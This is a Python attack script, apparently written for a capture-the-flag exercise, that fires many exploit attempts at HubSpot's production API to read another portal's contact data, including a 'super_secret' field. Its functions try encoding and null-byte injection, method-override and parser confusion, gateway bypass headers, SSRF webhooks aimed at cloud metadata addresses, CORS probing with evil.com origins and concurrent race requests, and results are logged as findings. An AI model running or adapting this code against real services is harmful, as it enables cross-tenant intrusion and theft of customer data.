#!/usr/bin/env python3
"""
Zero-Day Hunter - Advanced CTF Attack Techniques
Tests exotic edge cases and logic flaws
"""

import requests
import json
import os
import urllib3
import time
import base64
from urllib.parse import quote, quote_plus
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print(" ZERO-DAY HUNTER - Advanced Attack Techniques")
print("="*80)
print(f"Target: Portal {TARGET_PORTAL}")
print(f"Strategy: Test exotic edge cases, parser differentials, logic flaws")
print("="*80)

findings = []

def log_success(attack, details, response_data):
    """Log successful findings"""
    finding = {
        'attack': attack,
        'details': details,
        'response': response_data,
        'timestamp': time.time()
    }
    findings.append(finding)
    print(f"\n POTENTIAL FINDING!")
    print(f"Attack: {attack}")
    print(f"Details: {details}")
    print(f"Response: {json.dumps(response_data, indent=2)[:500]}")
    print("="*80)

# ============================================================================
# 1. EXOTIC ENCODING ATTACKS
# ============================================================================

def test_exotic_encodings():
    """Test various encoding techniques"""
    print("\n[*] Testing exotic encodings...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    base_url = 'https://api.hubapi.com/crm/v3/objects/contacts/1'

    # Different encoding variations for portal ID
    encodings = {
        'Double URL encode': quote(quote(TARGET_PORTAL)),
        'Hex encode': TARGET_PORTAL.encode().hex(),
        'Unicode escape': ''.join(f'\\u{ord(c):04x}' for c in TARGET_PORTAL),
        'Base64': base64.b64encode(TARGET_PORTAL.encode()).decode(),
        'Null byte injection': f'{TARGET_PORTAL}%00',
        'Newline injection': f'{TARGET_PORTAL}%0a',
        'Carriage return': f'{TARGET_PORTAL}%0d',
        'Tab injection': f'{TARGET_PORTAL}%09',
        'Space injection': f'{TARGET_PORTAL}%20',
        'Backslash': f'{TARGET_PORTAL}\\',
        'Forward slash': f'{TARGET_PORTAL}/',
        'Semicolon': f'{TARGET_PORTAL};',
        'Ampersand': f'{TARGET_PORTAL}&',
        'Pipe': f'{TARGET_PORTAL}|',
        'Backtick': f'{TARGET_PORTAL}`',
        'Single quote': f"'{TARGET_PORTAL}'",
        'Double quote': f'"{TARGET_PORTAL}"',
    }

    for name, encoded in encodings.items():
        try:
            url = f'{base_url}?portalId={encoded}&properties=firstname,super_secret,email'
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    log_success(f"Encoding: {name}", encoded, data)
            elif r.status_code not in [400, 401, 403, 404, 503]:
                print(f"  {name}: {r.status_code} (unusual)")
        except:
            pass

# ============================================================================
# 2. HTTP METHOD OVERRIDE
# ============================================================================

def test_method_override():
    """Test HTTP method override headers"""
    print("\n[*] Testing HTTP method override...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'

    # Method override headers
    override_headers = [
        {'X-HTTP-Method-Override': 'GET'},
        {'X-HTTP-Method': 'GET'},
        {'X-METHOD-OVERRIDE': 'GET'},
        {'_method': 'GET'},
        {'X-HTTP-Method-Override': 'POST'},
        {'X-HTTP-Method-Override': 'PUT'},
    ]

    for override in override_headers:
        try:
            # Try POST with override to GET
            h = {**headers, **override}
            r = requests.post(url, headers=h, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    log_success("Method Override", override, data)
        except:
            pass

# ============================================================================
# 3. CONTENT-TYPE CONFUSION
# ============================================================================

def test_content_type_confusion():
    """Test content-type parsing differentials"""
    print("\n[*] Testing content-type confusion...")

    auth_header = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    base_url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

    # Search payload
    payload = {
        'filterGroups': [],
        'properties': ['firstname', 'super_secret', 'email'],
        'limit': 100,
        'portalId': TARGET_PORTAL
    }

    # Different content-types
    content_types = [
        'application/json',
        'application/json; charset=utf-8',
        'application/json; charset=utf-16',
        'application/json; charset=iso-8859-1',
        'application/x-www-form-urlencoded',
        'text/plain',
        'application/xml',
        'multipart/form-data',
        'application/json, application/json',  # Duplicate
        'application/json; application/xml',    # Multiple
    ]

    for ct in content_types:
        try:
            headers = {**auth_header, 'Content-Type': ct}

            if 'json' in ct:
                r = requests.post(base_url, headers=headers, json=payload, verify=False, timeout=5)
            else:
                r = requests.post(base_url, headers=headers, data=json.dumps(payload), verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if data.get('results'):
                    log_success("Content-Type Confusion", ct, data)
        except:
            pass

# ============================================================================
# 4. DEEP JSON NESTING AND PARSER ATTACKS
# ============================================================================

def test_json_parser_attacks():
    """Test JSON parser edge cases"""
    print("\n[*] Testing JSON parser attacks...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

    # Various JSON edge cases
    payloads = [
        # Nested portalId
        {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100,
            'portalId': {'value': TARGET_PORTAL}
        },
        # Array portalId
        {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100,
            'portalId': [TARGET_PORTAL]
        },
        # Multiple portalId fields
        {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100,
            'portalId': MY_PORTAL,
            'portal_id': TARGET_PORTAL
        },
        # portalId at different nesting levels
        {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100,
            'config': {
                'portalId': TARGET_PORTAL
            }
        },
        # Unicode in portalId
        {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100,
            'portalId': f'{TARGET_PORTAL}\u0000'
        },
    ]

    for i, payload in enumerate(payloads, 1):
        try:
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if data.get('results'):
                    log_success(f"JSON Parser Attack #{i}", payload, data)
        except:
            pass

# ============================================================================
# 5. UNICODE AND CHARSET ATTACKS
# ============================================================================

def test_unicode_attacks():
    """Test Unicode normalization and charset attacks"""
    print("\n[*] Testing Unicode attacks...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    base_url = 'https://api.hubapi.com/crm/v3/objects/contacts/1'

    # Unicode variations
    unicode_tricks = {
        'Fullwidth digits': ''.join(chr(0xFF10 + int(c)) if c.isdigit() else c for c in TARGET_PORTAL),
        'Right-to-left override': f'\u202e{TARGET_PORTAL}',
        'Zero-width space': TARGET_PORTAL.replace('', '\u200b'),
        'Invisible separator': TARGET_PORTAL.replace('', '\u2063'),
        'Combining characters': TARGET_PORTAL + '\u0301',
    }

    for name, variant in unicode_tricks.items():
        try:
            url = f'{base_url}?portalId={variant}&properties=firstname,super_secret,email'
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    log_success(f"Unicode: {name}", variant, data)
        except:
            pass

# ============================================================================
# 6. TIMING-BASED SIDE CHANNEL
# ============================================================================

def test_timing_attack():
    """Test for timing-based information disclosure"""
    print("\n[*] Testing timing-based attacks...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Test if response time differs for existing vs non-existing contacts
    contact_ids = [1, 2, 3, 999999, 1000000]
    timings = {}

    for cid in contact_ids:
        times = []
        for _ in range(3):  # Test 3 times each
            url = f'https://api.hubapi.com/crm/v3/objects/contacts/{cid}?portalId={TARGET_PORTAL}'
            start = time.time()
            try:
                r = requests.get(url, headers=headers, verify=False, timeout=10)
                elapsed = time.time() - start
                times.append(elapsed)
            except:
                pass

        if times:
            avg_time = sum(times) / len(times)
            timings[cid] = avg_time
            print(f"  Contact {cid}: {avg_time:.3f}s avg")

    # Look for significant timing differences
    if len(timings) > 1:
        min_time = min(timings.values())
        max_time = max(timings.values())
        if max_time - min_time > 0.5:  # More than 500ms difference
            print(f"     Significant timing difference detected: {max_time - min_time:.3f}s")
            findings.append({
                'attack': 'Timing Side Channel',
                'details': 'Significant timing differences detected',
                'timings': timings
            })

# ============================================================================
# 7. API GATEWAY BYPASS TECHNIQUES
# ============================================================================

def test_api_gateway_bypass():
    """Test techniques to bypass API gateway"""
    print("\n[*] Testing API gateway bypasses...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Different host headers and URL variations
    bypass_attempts = [
        # Path traversal
        {
            'url': f'https://api.hubapi.com/crm/v3/../v3/objects/contacts/1?portalId={TARGET_PORTAL}',
            'headers': headers
        },
        # Double slash
        {
            'url': f'https://api.hubapi.com//crm//v3//objects//contacts//1?portalId={TARGET_PORTAL}',
            'headers': headers
        },
        # URL encoding of slashes
        {
            'url': f'https://api.hubapi.com/crm%2Fv3%2Fobjects%2Fcontacts%2F1?portalId={TARGET_PORTAL}',
            'headers': headers
        },
        # Host header injection
        {
            'url': f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
            'headers': {**headers, 'Host': 'localhost'}
        },
        # X-Forwarded-Host
        {
            'url': f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
            'headers': {**headers, 'X-Forwarded-Host': 'api.hubapi.com'}
        },
        # X-Original-URL
        {
            'url': 'https://api.hubapi.com/',
            'headers': {**headers, 'X-Original-URL': f'/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'}
        },
        # X-Rewrite-URL
        {
            'url': 'https://api.hubapi.com/',
            'headers': {**headers, 'X-Rewrite-URL': f'/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'}
        },
    ]

    for i, attempt in enumerate(bypass_attempts, 1):
        try:
            r = requests.get(attempt['url'], headers=attempt['headers'], verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    log_success(f"API Gateway Bypass #{i}", attempt, data)
        except:
            pass

# ============================================================================
# 8. SSRF VIA CALLBACK/WEBHOOK PARAMETERS
# ============================================================================

def test_ssrf():
    """Test for SSRF via URL parameters"""
    print("\n[*] Testing SSRF attacks...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Try to create a webhook that might fetch internal resources
    ssrf_urls = [
        f'http://localhost/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
        f'http://127.0.0.1/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
        f'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        f'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
    ]

    for ssrf_url in ssrf_urls:
        try:
            # Try to create a webhook with SSRF URL
            payload = {
                'url': ssrf_url,
                'enabled': False  # Don't actually trigger it
            }

            r = requests.post(
                'https://api.hubapi.com/webhooks/v3/subscriptions',
                headers=headers,
                json=payload,
                verify=False,
                timeout=5
            )

            print(f"  SSRF attempt: {r.status_code}")
            if r.status_code not in [400, 401, 403, 404]:
                print(f"    Response: {r.text[:200]}")
        except:
            pass

# ============================================================================
# 9. INTEGER OVERFLOW/UNDERFLOW
# ============================================================================

def test_integer_attacks():
    """Test integer overflow/underflow"""
    print("\n[*] Testing integer attacks...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    base_url = 'https://api.hubapi.com/crm/v3/objects/contacts/1'

    # Various integer values
    integer_tests = {
        'Max int32': '2147483647',
        'Max int32 + 1': '2147483648',
        'Max int64': '9223372036854775807',
        'Negative': '-1',
        'Negative large': '-999999999',
        'Zero': '0',
        'Float': '46962361.5',
        'Scientific notation': '4.6962361e7',
        'Hex': '0x2ccf239',
        'Octal': '0o226371071',
    }

    for name, value in integer_tests.items():
        try:
            url = f'{base_url}?portalId={value}&properties=firstname,super_secret,email'
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    log_success(f"Integer Attack: {name}", value, data)
        except:
            pass

# ============================================================================
# 10. WEBSOCKET ENDPOINTS
# ============================================================================

def test_websocket_endpoints():
    """Check for WebSocket endpoints"""
    print("\n[*] Checking WebSocket endpoints...")

    # Common WebSocket paths
    ws_paths = [
        'wss://app.hubspot.com/api/websocket',
        'wss://api.hubapi.com/websocket',
        'wss://api.hubspot.com/ws',
    ]

    for ws_url in ws_paths:
        try:
            # Just check if the endpoint exists
            http_url = ws_url.replace('wss://', 'https://')
            r = requests.get(http_url, verify=False, timeout=5)
            print(f"  {ws_url.split('/')[2]}: {r.status_code}")

            if r.status_code not in [400, 401, 403, 404, 503]:
                print(f"     Unusual response: {r.text[:200]}")
        except:
            pass

# ============================================================================
# 11. CORS MISCONFIGURATION EXPLOITATION
# ============================================================================

def test_cors_exploitation():
    """Test CORS misconfigurations"""
    print("\n[*] Testing CORS exploitation...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'

    # Different Origin headers
    origins = [
        'null',
        'https://app.hubspot.com',
        f'https://app.hubspot.com.evil.com',
        'https://evil.com',
        'http://localhost',
        'https://127.0.0.1',
    ]

    for origin in origins:
        try:
            h = {**headers, 'Origin': origin}
            r = requests.get(url, headers=h, verify=False, timeout=5)

            acao = r.headers.get('Access-Control-Allow-Origin')
            acac = r.headers.get('Access-Control-Allow-Credentials')

            if acao and acao != 'https://app.hubspot.com':
                print(f"  Origin {origin}: ACAO={acao}, ACAC={acac}")

                if acao == origin or acao == '*':
                    findings.append({
                        'attack': 'CORS Misconfiguration',
                        'origin': origin,
                        'acao': acao,
                        'acac': acac
                    })
        except:
            pass

# ============================================================================
# 12. RACE CONDITION HELPER
# ============================================================================

def test_simple_race_condition():
    """Test simple race condition"""
    print("\n[*] Testing simple race condition (10 concurrent requests)...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'

    def make_request():
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    return ('SUCCESS', data)
            return (r.status_code, None)
        except Exception as e:
            return ('ERROR', str(e))

    # Send 10 concurrent requests
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_request) for _ in range(10)]

        for future in as_completed(futures):
            status, data = future.result()
            if status == 'SUCCESS':
                log_success("Race Condition", "Concurrent request succeeded", data)
                return

# ============================================================================
# MAIN EXECUTION
# ============================================================================

print("\n Starting zero-day hunting...\n")

test_exotic_encodings()
test_method_override()
test_content_type_confusion()
test_json_parser_attacks()
test_unicode_attacks()
test_timing_attack()
test_api_gateway_bypass()
test_ssrf()
test_integer_attacks()
test_websocket_endpoints()
test_cors_exploitation()
test_simple_race_condition()

print("\n" + "="*80)
print(f" Zero-Day Hunting Complete!")
print(f" Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n POTENTIAL ZERO-DAY VULNERABILITIES FOUND:\n")
    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding.get('attack', 'Unknown')}")
        print(f"   {json.dumps(finding, indent=3)[:400]}...\n")

    with open('/home/user/Hub/findings/zero_day_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)
    print(f"\n Saved to: findings/zero_day_findings.json")
else:
    print("\n No zero-day vulnerabilities found with these techniques.")
    print("\n Next approaches:")
    print("  • Fresh session cookies + retry all tests")
    print("  • More aggressive race conditions (100+ requests)")
    print("  • Manual code review of HubSpot's open-source components")
    print("  • Research HubSpot's technology stack for known vulnerabilities")
